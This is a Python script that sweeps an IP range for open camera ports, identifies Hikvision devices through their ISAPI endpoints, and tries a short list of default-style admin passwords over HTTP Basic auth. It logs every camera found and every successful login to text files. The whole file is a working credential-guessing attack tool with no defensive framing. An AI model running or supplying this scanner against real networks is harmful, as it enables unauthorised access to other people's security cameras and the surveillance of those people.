import socket
import requests
import base64
import hashlib
import uuid
import xml.etree.ElementTree as ET

def encode_password(password):
    return base64.b64encode(password.encode("utf-8")).decode("utf-8")

def check_ip(ip, port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)  
        result = sock.connect_ex((ip, port))
        sock.close()
        return result == 0  
    except Exception as e:
        print(f"[!] Error checking {ip}:{port} - {e}")
        return False

def is_hikvision_camera(ip):
    try:
        hikvision_urls = [
            "/ISAPI/Security/userCheck",
            "/ISAPI/Security/sessionLogin",
            "/ISAPI/System/deviceInfo"
        ]
        for url in hikvision_urls:
            full_url = f"http://{ip}{url}"
            response = requests.get(full_url, timeout=3)
            if response.status_code in [200, 401]:  
                return True
    except requests.RequestException as e:
        print(f"[!] Error checking Hikvision camera at {ip}: {e}")
    return False

def hikvision_login(ip, username, password):
    try:
        login_url = f"http://{ip}/ISAPI/Security/userCheck"
        
        
        credentials = f"{username}:{password}"
        encoded_credentials = base64.b64encode(credentials.encode("utf-8")).decode("utf-8")

        headers = {
            "Authorization": f"Basic {encoded_credentials}",
            "Content-Type": "application/xml",
            "X-Requested-With": "XMLHttpRequest",
        }

        response = requests.get(login_url, headers=headers, timeout=5)

        if response.status_code == 200:
            print(f"[+] Successful login: {ip} | {username}:{password}")
            return True
        elif response.status_code == 401:
            print(f"[-] Login failed (Unauthorized) for {ip}")
        else:
            print(f"[!] Unexpected response {response.status_code} for {ip}: {response.text}")
    except requests.RequestException as e:
        print(f"[!] Error logging in to {ip}: {e}")
    return False

def scan_ip_range(start_ip, end_ip, output_file, success_file):
    start = list(map(int, start_ip.split('.')))
    end = list(map(int, end_ip.split('.')))

    
    camera_ports = [80, 554, 8000]

    
    usernames = ["admin"]
    passwords = ["admin123","admin1234","admin12345","admin123456"]

    with open(output_file, 'w') as file, open(success_file, 'w') as success:
        while start <= end:
            ip = ".".join(map(str, start))
            if any(check_ip(ip, port) for port in camera_ports):
                if is_hikvision_camera(ip):
                    file.write(f"{ip}\n")
                    print(f"[+] Found Hikvision camera: {ip}")
                    
                    for username in usernames:
                        for password in passwords:
                            if hikvision_login(ip, username, password):
                                success.write(f"IP: {ip}, Username: {username}, Password: {password}\n")
                                break  
            start[3] += 1
            for i in range(3, 0, -1):
                if start[i] > 255:
                    start[i] = 0
                    start[i-1] += 1

if __name__ == "__main__":
    start_ip = input("Enter start IP (e.g., 192.168.1.1): ")
    end_ip = input("Enter end IP (e.g., 192.168.1.255): ")
    output_file = "hikvision_camera_ips.txt"
    success_file = "successful_hikvision_logins.txt"

    scan_ip_range(start_ip, end_ip, output_file, success_file)
    print(f"Scan complete. Results saved to {output_file} and {success_file}")
